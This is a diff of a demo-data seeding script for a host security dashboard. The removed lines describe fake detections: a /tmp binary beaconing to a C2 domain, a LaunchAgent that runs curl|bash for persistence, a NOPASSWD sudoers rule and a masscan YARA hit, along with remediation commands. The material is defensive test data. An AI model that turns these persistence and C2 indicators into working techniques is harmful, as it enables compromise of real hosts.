-        rule="hacktool_multi_masscan",
-        namespace="signature-base",
-        scan_source="bin_dirs",
-        sha256="f" * 64,
-        size=2_400_000,
-        meta_json=json.dumps(
-            {"author": "@mimeframe", "description": "Masscan mass IP port scanner"}
-        ),
-    )
 
-    # ---- auth_events (streaming) ----
-    cr(
-        AuthEventRow,
-        event_timestamp=LATEST,
-        process="sudo",
-        subsystem="com.apple.securityd",
-        category="auth",
-        event_type="failure",
-        event_message="authentication failure for iklo",
-        pid=940,
-    )
-    cr(
-        AuthEventRow,
-        event_timestamp=LATEST,
-        process="sshd",
-        subsystem="com.apple.securityd",
-        category="auth",
-        event_type="failure",
-        event_message="Failed password for invalid user admin",
-        pid=720,
-    )
+class BulkFiller:
+    """Inserts batches of historical rows across the heavy time-series
+    tables until the DB file reaches a target size."""
 
-    # ---- streaming sessions ----
-    rows.append(
-        StreamingSession(
-            run_id="sess-auth",
-            collector="auth_events",
-            hostname=HOST,
-            started_at=LATEST,
-            finished_at=None,
-            row_count=574,
-        )
-    )
-    rows.append(
-        StreamingSession(
-            run_id="sess-exec",
-            collector="process_exec_events",
-            hostname=HOST,
-            started_at=LATEST,
-            finished_at=None,
-            row_count=88,
-        )
-    )
+    BATCH_ROWS = 10000
 
-    # ---- judgements (link to collector rows by content_hash) ----
-    def judge(
-        ch,
-        collector,
-        verdict,
-        category,
-        conf,
-        reason,
-        fix,
-        novel=None,
-        ctx=None,
-        cost=0.00009,
-    ):
-        rows.append(
-            Judgement(
-                content_hash=ch,
-                collector=collector,
-                verdict=verdict,
-                category=category,
-                confidence=conf,
-                reasoning=reason,
-                remediation=fix,
-                model="claude-haiku-4-5-20251001",
-                created_at=LATEST,
-                last_seen_at=LATEST,
-                novel=novel,
-                context_json=json.dumps(ctx) if ctx else None,
-                cost_usd=cost,
-            )
+    def __init__(self, engine: Engine, history: list[BulkRun]) -> None:
+        self._engine = engine
+        self._history = history
+
+    def fill(self, database: DatabaseFile, target_bytes: int) -> int:
+        batch = 0
+        while database.size_bytes() < target_bytes:
+            run = self._history[batch % len(self._history)]
+            self._insert(run, batch)
+            batch += 1
+        return database.size_bytes()
+
+    def _insert(self, run: BulkRun, batch: int) -> None:
+        stamps = [BulkStamp(run, batch, index) for index in range(self.BATCH_ROWS)]
+        with self._engine.begin() as conn:
+            for model, build in self._tables():
+                conn.execute(insert(model), [build(stamp) for stamp in stamps])
+
+    def _tables(
+        self,
+    ) -> tuple[
+        tuple[type[DeclarativeBase], Callable[[BulkStamp], dict[str, object]]], ...
+    ]:
+        processes, network = BulkProcessRows(), BulkNetworkRows()
+        return (
+            (ProcessRow, processes.process),
+            (AuthEventRow, network.auth_event),
+            (NetworkConnectionRow, network.connection),
+            (DnsQueryRow, network.dns_query),
+            (ProcessExecRow, processes.process_exec),
         )
 
-    proc_ctx = {
-        "baseline": {
-            "novel": True,
-            "first_seen": LATEST,
-            "times_seen": 1,
-            "host_runs": 6,
-            "baseline_established": True,
-        },
-        "related": {
-            "listening_ports": ["0.0.0.0:4444"],
-            "outbound_flows": [
-                {"dst": "9.9.9.9:443", "service": "https", "packets": 120}
-            ],
-            "remote_connections": ["9.9.9.9:443 ESTABLISHED"],
-            "dns_queries": ["c2-sync.example (A)"],
-            "exec_lineage": {"parent": "/bin/zsh", "signed": None, "exe": "/tmp/.x"},
-        },
-    }
-    judge(
-        "p_evil",
-        "processes",
-        "malicious",
-        "execution",
-        0.94,
-        "Unsigned binary in /tmp with high CPU, beaconing to a flagged IP.",
-        "Kill pid 66610; rm /tmp/.x; investigate parent shell.",
-        novel=1,
-        ctx=proc_ctx,
-        cost=0.00021,
-    )
-    judge(
-        "p_chrome",
-        "processes",
-        "benign",
-        "none",
-        0.98,
-        "Signed mainstream browser.",
-        "",
-    )
-    judge(
-        "li_evil",
-        "launch_items",
-        "malicious",
-        "persistence",
-        0.92,
-        "LaunchAgent runs curl|bash at load — classic persistence.",
-        "launchctl unload ~/Library/LaunchAgents/com.evil.persist.plist; delete the plist.",
-        novel=1,
-        cost=0.00015,
-    )
-    judge(
-        "nf_evil",
-        "network_flows",
-        "suspicious",
-        "command_and_control",
-        0.8,
-        "Steady low-volume beacon to 9.9.9.9:443 from /tmp binary.",
-        "Block 9.9.9.9; correlate with pid 66610.",
-        cost=0.00011,
-    )
-    judge(
-        "dns_evil",
-        "dns_queries",
-        "malicious",
-        "command_and_control",
-        0.85,
-        "Repeated lookups of c2-sync.example (likely C2).",
-        "Sinkhole the domain; inspect the querying process.",
-        cost=0.00010,
-    )
-    judge(
-        "lp_evil",
-        "listening_ports",
-        "suspicious",
-        "command_and_control",
-        0.7,
-        "Unsigned binary listening on 0.0.0.0:4444.",
-        "Close the port; terminate pid 66610.",
-        cost=0.00008,
-    )
-    judge(
-        "hosts_susp",
-        "hosts_file",
-        "suspicious",
-        "defense_evasion",
-        0.78,
-        "Bank login domain pointed at 127.0.0.1 (possible phishing/MITM).",
-        "Remove the /etc/hosts override.",
-        cost=0.00007,
-    )
-    judge(
-        "priv_susp",
-        "privilege_config",
-        "suspicious",
-        "privilege_escalation",
-        0.72,
-        "NOPASSWD ALL sudoers rule for a non-admin user.",
-        "Remove /etc/sudoers.d/iklo or scope it tightly.",
-        cost=0.00007,
-    )
-    judge(
-        "ssh_susp",
-        "ssh_authorized_keys",
-        "suspicious",
-        "persistence",
-        0.74,
-        "Authorized key with 'root@kali' comment.",
-        "Remove the unknown key from ~/.ssh/authorized_keys.",
-        cost=0.00006,
-    )
-    judge(
-        "be_susp",
-        "browser_extensions",
-        "suspicious",
-        "collection",
-        0.66,
-        "Extension requests <all_urls> + webRequest + cookies.",
-        "Review/remove the extension at chrome://extensions.",
-        cost=0.00006,
-    )
-    judge(
-        "fs_eicar",
-        "file_scan",
-        "malicious",
-        "test_signature",
-        0.99,
-        "EICAR test file matched a YARA rule — harmless test artifact, but "
-        "confirms the file scanner is working.",
-        "Delete the EICAR test file from ~/Downloads.",
-        cost=0.00005,
-    )
-    judge(
-        "fs_hacktool",
-        "file_scan",
-        "suspicious",
-        "hacktool",
-        0.7,
-        "masscan binary present — legitimate for pentesters, suspicious on a "
-        "general-purpose host.",
-        "Confirm masscan is expected; remove if not.",
-        cost=0.00006,
-    )
 
-    # ---- risk scores (sparkline + drivers) ----
-    scores = [88, 85, 80, 78, 72, 60]
-    drivers = [
-        {"label": "Firewall off", "points": 15},
-        {"label": "Remote login (SSH) enabled", "points": 10},
-        {"label": "2 active malicious finding(s)", "points": 40},
-        {"label": "4 active suspicious finding(s)", "points": 24},
-        {"label": "1 NOPASSWD sudoers rule(s)", "points": 10},
-    ]
-    prev = None
-    for (rid, st, _fin), sc in zip(runs, scores):
-        grade = (
-            "A"
-            if sc >= 90
-            else "B" if sc >= 80 else "C" if sc >= 70 else "D" if sc >= 60 else "F"
+class SeedReport:
+    def __init__(self, out: TextIO, db_path: str) -> None:
+        self._out = out
+        self._db_path = db_path
+
+    def write(self) -> None:
+        size = DatabaseFile(self._db_path).size_mb()
+        self._out.write(f"seeded {self._db_path} ({size:.1f} MB)\n")
+        with closing(sqlite3.connect(self._db_path)) as connection:
+            for table in SUMMARY_TABLES:
+                query = f"select count(*) from {table}"
+                count = connection.execute(query).fetchone()[0]
+                self._out.write(f"  {count:>4}  {table}\n")
+        self._out.write("done: start the dashboard to view.\n")
+
+
+class DemoSeedCli:
+    def __init__(self, out: TextIO) -> None:
+        self._out = out
+
+    @classmethod
+    def main(cls) -> None:
+        args = cls(sys.stdout).parser().parse_args()
+        cls(sys.stdout).seed(args, datetime.now(timezone.utc).replace(microsecond=0))
+
+    def parser(self) -> argparse.ArgumentParser:
+        parser = argparse.ArgumentParser(description="Seed avai DB with demo data.")
+        parser.add_argument("--db", default=os.path.expanduser(DEFAULT_DB))
+        parser.add_argument(
+            "--target-mb",
+            type=float,
+            default=0.0,
+            help="If >0, bulk-fill historical rows until the DB is at least this "
+            "many MB (the demo snapshot stays the latest run).",
         )
-        last = rid == LATEST_RID
-        rows.append(
-            RiskScoreRow(
-                created_at=st,
-                run_id=rid,
-                score=sc,
-                grade=grade,
-                prev_score=prev,
-                drivers_json=json.dumps(drivers if last else drivers[:2]),
-                explanation=(
-                    "Score down 12. New: 2 active malicious finding(s); "
-                    "4 active suspicious finding(s)."
-                    if last
-                    else "Posture drift."
-                ),
-            )
+        return parser
+
+    def seed(self, args: argparse.Namespace, now: datetime) -> None:
+        engine = create_engine(
+            f"sqlite:///{args.db}", connect_args={"check_same_thread": False}
         )
-        prev = sc
+        Sink.create(engine).setup()  # create_all + enrichment model + migrate
+        clock = DemoClock(now)
+        tokens = SeedTokens(clock, Path.home())
+        rows = DemoSnapshot(DemoModels(Base), tokens).rows(SEED_FILE)
+        with Session(engine) as session:
+            session.add_all(rows)
+            session.commit()
+        if args.target_mb > 0:
+            self._bulk_fill(engine, clock, args)
+        SeedReport(self._out, args.db).write()
 
-    # ---- incident narrative (structured) ----
-    rows.append(
-        IncidentNarrativeRow(
-            created_at=LATEST,
-            run_id=LATEST_RID,
-            model="claude-haiku-4-5-20251001",
-            severity="critical",
-            headline="Unsigned /tmp binary beaconing to a flagged IP with LaunchAgent persistence",
-            summary=(
-                "A novel unsigned binary (/tmp/.x) is beaconing to 9.9.9.9 and "
-                "resolving a C2 domain, with a curl|bash LaunchAgent installed for persistence."
-            ),
-            timeline_json=json.dumps(
-                [
-                    {
-                        "time": LATEST,
-                        "title": "Unsigned binary /tmp/.x executed",
-                        "category": "execution",
-                        "detail": "Spawned by /bin/zsh; high CPU.",
-                    },
-                    {
-                        "time": LATEST,
-                        "title": "LaunchAgent com.evil.persist added",
-                        "category": "persistence",
-                        "detail": "RunAtLoad curl|bash.",
-                    },
-                    {
-                        "time": LATEST,
-                        "title": "Beacon to 9.9.9.9:443 + c2-sync.example",
-                        "category": "command_and_control",
-                        "detail": "Steady low-volume flow.",
-                    },
-                ]
-            ),
-            actions_json=json.dumps(
-                [
-                    {
-                        "priority": "immediate",
-                        "title": "Kill and remove the binary",
-                        "command": "kill 66610 && rm -f /tmp/.x",
-                        "detail": "Stop the beacon.",
-                    },
-                    {
-                        "priority": "immediate",
-                        "title": "Remove persistence",
-                        "command": "launchctl unload ~/Library/LaunchAgents/com.evil.persist.plist",
-                        "detail": "Then delete the plist.",
-                    },
-                    {
-                        "priority": "high",
-                        "title": "Block the C2 destination",
-                        "command": "",
-                        "detail": "Block 9.9.9.9 and sinkhole c2-sync.example.",
-                    },
-                ]
-            ),
-            finding_count=6,
-            finding_hashes=json.dumps(
-                sorted(
-                    [
-                        "p_evil",
-                        "li_evil",
-                        "nf_evil",
-                        "dns_evil",
-                        "lp_evil",
-                        "hosts_susp",
-                    ]
-                )
-            ),
-        )
-    )
-
-    # ---- enrichment_evidence (Vulnerabilities panel + forward-chained CVEs) ----
-    def evid(source, itype, value, hint, conf, summary, details):
-        rows.append(
-            EVID(
-                source=source,
-                indicator_type=itype,
-                indicator_value=value,
-                verdict_hint=hint,
-                confidence=conf,
-                summary=summary,
-                details_json=json.dumps(details),
-                fetched_at=LATEST,
-            )
-        )
-
-    evid(
-        "osv",
-        "package",
-        "openssl@3.0.2",
-        "suspicious",
-        0.75,
-        "OSV: 1 advisory hit(s): CVE-2024-0001",
-        {"vuln_ids": ["CVE-2024-0001"]},
-    )
-    evid(
-        "osv",
-        "package",
-        "libcurl@7.88.0",
-        "suspicious",
-        0.75,
-        "OSV: 1 advisory hit(s): CVE-2023-38545",
-        {"vuln_ids": ["CVE-2023-38545"]},
-    )
-    evid(
-        "nvd",
-        "cve",
-        "CVE-2024-0001",
-        "malicious",
-        0.7,
-        "NVD: CVSS=9.8 CRITICAL — heap overflow",
-        {"cvss31": {"baseScore": 9.8, "baseSeverity": "CRITICAL"}},
-    )
-    evid(
-        "nvd",
-        "cve",
-        "CVE-2023-38545",
-        "malicious",
-        0.7,
-        "NVD: CVSS=9.8 CRITICAL — SOCKS5 heap buffer overflow",
-        {"cvss31": {"baseScore": 9.8, "baseSeverity": "CRITICAL"}},
-    )
-    evid(
-        "cisa_kev",
-        "cve",
-        "CVE-2023-38545",
-        "malicious",
-        0.98,
-        "CISA KEV: actively exploited",
-        {"knownRansomwareCampaignUse": "Unknown"},
-    )
-    evid(
-        "github_advisory",
-        "cve",
-        "CVE-2024-0001",
-        "malicious",
-        0.9,
-        "GH Advisory: severity=critical",
-        {"severity": "critical", "cvss": {"score": 9.8}},
-    )
-    evid(
-        "endoflife",
-        "os_version",
-        "macos@12",
-        "suspicious",
-        0.6,
-        "macOS 12 is end-of-life — no security updates.",
-        {"eol": True},
-    )
-
-    with Session(engine) as s:
-        s.add_all(rows)
-        s.commit()
-
-    # ---- optional bulk fill to reach a target on-disk size ----
-    if args.target_mb > 0:
-        target = int(args.target_mb * 1024 * 1024)
-        print(f"bulk-filling to >= {args.target_mb:.0f} MB …")
-        size = bulk_fill(engine, args.db, target, now)
-        print(f"  reached {size / 1024 / 1024:.1f} MB")
-
-    # ---- summary ----
-    import sqlite3
-
-    con = sqlite3.connect(args.db)
-    print(f"seeded {args.db} ({_db_size_bytes(args.db) / 1024 / 1024:.1f} MB)")
-    for t in (
-        "collection_runs",
-        "judgements",
-        "incident_narratives",
-        "risk_scores",
-        "enrichment_evidence",
-    ):
-        n = con.execute(f"select count(*) from {t}").fetchone()[0]
-        print(f"  {n:>4}  {t}")
-    print("done — start the dashboard to view.")
+    def _bulk_fill(
+        self, engine: Engine, clock: DemoClock, args: argparse.Namespace
+    ) -> None:
+        self._out.write(f"bulk-filling to >= {args.target_mb:.0f} MB …\n")
+        filler = BulkFiller(engine, BulkHistory(engine, clock).write())
+        target = int(args.target_mb * BYTES_PER_MB)
+        size = filler.fill(DatabaseFile(args.db), target)
+        self._out.write(f"  reached {size / BYTES_PER_MB:.1f} MB\n")
 
 
 if __name__ == "__main__":
-    main()
+    DemoSeedCli.main()
